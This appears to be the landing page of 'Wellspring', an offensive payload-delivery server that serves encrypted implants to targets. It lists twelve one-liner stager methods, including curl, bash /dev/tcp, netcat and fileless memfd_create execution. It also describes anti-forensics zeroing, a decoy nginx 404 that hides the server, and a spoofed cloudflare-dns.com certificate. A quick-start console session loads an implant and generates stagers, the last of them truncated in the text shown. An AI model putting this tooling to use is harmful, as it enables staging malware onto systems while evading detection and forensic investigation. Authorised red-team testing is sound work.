// capabilities

Token-gated delivery. Encrypted at rest.

Single static Go binary serving payloads over dual TLS listeners. Every delivery is token-gated with configurable TTL, source locks, and use limits. All payloads AES-256-GCM encrypted in memory.

🔑

Token-Gated Access

Every payload requires a valid token with configurable TTL, max uses, and source IP/CIDR lock. HMAC-SHA256 keyed hashing prevents timing attacks. Expired tokens auto-purged with field zeroing.

🔒

AES-256-GCM at Rest

All payloads encrypted in memory with AES-256-GCM. Plaintext zeroed after delivery via runtime.KeepAlive to prevent compiler elision. Keys zeroed on exit.

⚖

12 Delivery Methods

Socat TLS/TCP/memfd/PTY, curl, wget, bash /dev/tcp, python urllib, netcat, perl IO::Socket::SSL, memfd_create fileless, /dev/shm tmpfs. Every loader validates inputs against strict character whitelists.

▶

Dual TLS Listeners

HTTPS on :443 serves payloads at GET /p/<token> for HTTP loaders. Raw TLS on :4443 reads token from first line and writes raw bytes for socat OPENSSL connections. TLS 1.3 minimum.

♦

Fileless Execution

memfd_create loaders execute payloads entirely in memory. /dev/shm staging uses tmpfs where memfd is unavailable. Both methods leave zero filesystem artifacts.

◤

Anti-Forensics

SIGINT/SIGTERM trigger immediate zeroing of all payloads, tokens, and cryptographic keys. Token values zeroed in-place via unsafe.StringData on revocation, expiry, and shutdown.

◆

Decoy Infrastructure

All HTTP responses use Server: nginx/1.24.0 header. Invalid tokens and unknown paths return an identical nginx 404 decoy. Indistinguishable from default nginx to casual inspection.

✓

53 Tests

Payload encryption, token lifecycle, arch detection, shell injection prevention, HTTPS delivery, raw TLS delivery, header consistency, ring buffer compaction, and anti-forensics with race detection.

// architecture

Dual listener delivery flow.

Operator loads payloads and generates token-bound stagers. Targets execute stagers to pull encrypted payloads through HTTPS or raw TLS. Memory is zeroed after every delivery.

01

Payload Loading

Operator loads binaries via the interactive console. Each payload is AES-256-GCM encrypted in memory with a random key. ELF/PE architecture auto-detected for metadata display.

02

Stager Generation

Generate one-liner stagers for any of 12 delivery methods. Each stager is bound to a unique token with configurable TTL, max uses, and source IP/CIDR restrictions.

03

Token Validation

Incoming requests validated via HMAC-SHA256 keyed lookup. TTL, use count, and source IP checked. Invalid requests receive identical nginx 404 decoy. No timing side channels.

04

Delivery + Zeroing

Payload decrypted from AES-256-GCM, delivered over TLS, then plaintext immediately zeroed with runtime.KeepAlive. Token consumed or decremented. Exhausted tokens purged.

// quick start

Build and deploy.

Clone, build the static binary, generate a TLS cert, and launch the interactive operator console.

build.sh 
# Build static binary
$ git clone https://github.com/Real-Fruit-Snacks/Wellspring
$ cd Wellspring
$ make build

# Generate TLS cert
$ ./build/wellspring -gencert -sni cloudflare-dns.com

# Start server
$ ./build/wellspring -cert server.crt -key server.key

# Run tests
$ make test
console.sh 
# Interactive console workflow
wellspring> payload add ./implant --name undertow
  [p1] undertow  ELF x86_64  284 KB

wellspring> generate p1 all --host 10.0.0.1 --port 443

  memfd       curl -sk ... | python3 -c ...
